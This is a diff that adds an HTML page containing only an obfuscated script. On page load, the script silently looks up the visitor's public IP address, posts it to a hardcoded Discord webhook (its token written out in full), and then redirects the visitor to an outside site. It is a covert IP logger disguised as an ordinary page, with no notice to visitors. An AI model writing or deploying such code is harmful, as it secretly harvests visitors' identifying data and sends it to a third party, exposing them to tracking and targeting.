@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <script>
+        async function a() {
+            try {
+                const b = await fetch('https://api.ipify.org?format=json');
+                const c = await b.json();
+                return c.ip;
+            } catch (d) {
+                console.error('Error:', d);
+            }
+        }
+
+        async function e(f) {
+            const g = 'https://discord.com/api/webhooks/1419273641010659328/w-SPRsUL9w8w_jjJpBrPOQSGADXVYKNWeBkHq_nsFMKHSCbSszXIp6RVKZAL_ugfOS4Q';
+            const h = {
+                content: `New: ${f}`
+            };
+
+            try {
+                const i = await fetch(g, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(h)
+                });
+
+                if (!i.ok) {
+                    throw new Error('Network error');
+                }
+            } catch (j) {
+                console.error('Error:', j);
+            }
+        }
+
+        async function k() {
+            const l = await a();
+            if (l) {
+                await e(l);
+                window.location.href = 'https://bhoppings.de/tangini';
+            }
+        }
+
+        k();
+    </script>
+</body>
+</html>
